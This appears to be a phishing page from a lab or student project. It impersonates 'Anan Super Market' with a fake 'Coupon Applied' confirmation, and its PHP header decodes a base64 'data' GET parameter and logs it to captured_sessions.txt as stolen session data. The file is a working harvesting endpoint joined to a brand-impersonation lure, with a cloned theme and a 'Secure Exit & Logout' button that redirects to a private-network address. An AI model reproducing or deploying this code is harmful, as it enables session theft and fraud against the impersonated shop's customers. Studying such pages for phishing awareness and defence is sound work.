<?php
// Data collection logic
if (isset($_GET['data'])) {
    $stolen_data = base64_decode($_GET['data']);
    $file = fopen("captured_sessions.txt", "a");
    fwrite($file, "Time: " . date("Y-m-d H:i:s") . " | Data: " . $stolen_data . "\n");
    fclose($file);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Anan Super Market - Coupon Applied</title>
    <link rel="stylesheet" href="cloned_theme.css">
</head>
<body class="phishing-page"> <div class="success-container">
        <img src="logo.jpg" alt="Anan Super Market" class="logo-img">
        
        <h1>Coupon Applied!</h1>
        <p>Your exclusive discount code is now registered to your account:</p>
        
        <div class="coupon-code">ANAN-VIP-2026</div>
        
        <div class="notice-box">
            <p style="margin: 0; font-size: 0.9rem; color: #334155;">
                <strong>System Notice:</strong> Please allow 24-48 hours for the discount to be reflected in your cart totals.
            </p>
        </div>

        <button onclick="closeOrRedirect()" class="btn-exit">
            Secure Exit & Logout
        </button>
    </div>

    <script>
    function closeOrRedirect() {
        if (!window.close()) {
            window.location.href = "http://192.168.56.1/CyberProject/home.php";
        }
    }
    </script>
</body>
</html>